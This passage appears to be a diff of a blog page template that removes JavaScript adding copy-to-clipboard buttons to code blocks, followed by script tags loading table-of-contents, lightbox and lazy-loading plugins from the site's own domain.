-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
